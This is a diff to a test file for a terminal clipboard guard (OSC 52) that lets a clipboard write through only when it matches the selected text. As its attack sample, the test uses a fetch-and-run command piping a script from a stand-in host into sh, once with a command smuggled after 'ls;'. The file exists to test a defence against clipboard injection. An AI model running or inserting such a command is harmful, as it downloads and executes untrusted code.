@@ -10,77 +10,67 @@ const context = {}
 vm.runInNewContext(readFileSync(new URL('osc52.js', import.meta.url), 'utf8'), context)
 const { javoClipboardGuard } = context
 
+// selected stands for the text the person has selected in the terminal
+// (xterm.js's getSelection()), '' when nothing is selected.
 function setUp() {
-  let clock = 10_000
+  const state = { selected: '' }
   const written = []
   const asked = []
   const guard = javoClipboardGuard({
-    now: () => clock,
+    selection: () => state.selected,
     write: (text) => written.push(text),
     ask: (text) => asked.push(text),
   })
-  return { guard, written, asked, tick: (ms) => (clock += ms) }
+  return { guard, written, asked, state }
 }
 
 const attack = 'curl https://evil.example/x | sh\n'
 
-test('a write no selection asked for is not made: the user is asked', () => {
+test('a write with nothing selected is not made: the person is asked', () => {
   const { guard, written, asked } = setUp()
   guard.offer(attack)
   assert.deepEqual(written, [])
   assert.deepEqual(asked, [attack])
 })
 
-test('a mouse drag that ends a selection lets the copy that follows through', () => {
-  const { guard, written, asked, tick } = setUp()
-  guard.pointerDown(100, 100)
-  tick(300)
-  guard.pointerUp(160, 100, 1)
-  tick(50)
+test('a write of exactly the selected text is made at once', () => {
+  const { guard, written, asked, state } = setUp()
+  state.selected = 'selected text'
   guard.offer('selected text')
   assert.deepEqual(written, ['selected text'])
   assert.deepEqual(asked, [])
 })
 
-test('a double or triple click selects too', () => {
-  for (const clicks of [2, 3]) {
-    const { guard, written } = setUp()
-    guard.pointerDown(100, 100)
-    guard.pointerUp(100, 100, clicks)
-    guard.offer('word')
-    assert.deepEqual(written, ['word'], `${clicks} clicks`)
-  }
-})
-
-test('a plain click is not a selection, nor is typing', () => {
-  const { guard, written, asked } = setUp()
-  guard.pointerDown(100, 100)
-  guard.pointerUp(101, 101, 1)
+test('a write of other text right after a selection is asked about, whatever its timing', () => {
+  const { guard, written, asked, state } = setUp()
+  state.selected = 'selected text'
   guard.offer(attack)
-  assert.deepEqual(written, [])
+  guard.offer('selected text')
+  assert.deepEqual(written, ['selected text'])
   assert.deepEqual(asked, [attack])
 })
 
-test('a selection admits one write, soon after it', () => {
-  const late = setUp()
-  late.guard.pointerDown(0, 0)
-  late.guard.pointerUp(50, 0, 1)
-  late.tick(1500)
-  late.guard.offer(attack)
-  assert.deepEqual(late.written, [])
-
-  const twice = setUp()
-  twice.guard.pointerDown(0, 0)
-  twice.guard.pointerUp(50, 0, 1)
-  twice.guard.offer('selected text')
-  twice.guard.offer(attack)
-  assert.deepEqual(twice.written, ['selected text'])
-  assert.deepEqual(twice.asked, [attack])
+test('text that only contains or starts with the selection is asked about', () => {
+  const { guard, written, asked, state } = setUp()
+  state.selected = 'ls'
+  guard.offer('ls; curl https://evil.example/x | sh')
+  guard.offer('l')
+  assert.deepEqual(written, [])
+  assert.deepEqual(asked, ['ls; curl https://evil.example/x | sh', 'l'])
 })
 
-test('a release without a press in the terminal is not a drag', () => {
-  const { guard, written } = setUp()
-  guard.pointerUp(500, 500, 1)
-  guard.offer(attack)
+test('an empty write with nothing selected cannot clear the clipboard silently', () => {
+  const { guard, written, asked } = setUp()
+  guard.offer('')
   assert.deepEqual(written, [])
+  assert.deepEqual(asked, [''])
+})
+
+test('the selection is read when the write arrives, not earlier', () => {
+  const { guard, written, asked, state } = setUp()
+  state.selected = 'old'
+  state.selected = ''
+  guard.offer('old')
+  assert.deepEqual(written, [])
+  assert.deepEqual(asked, ['old'])
 })
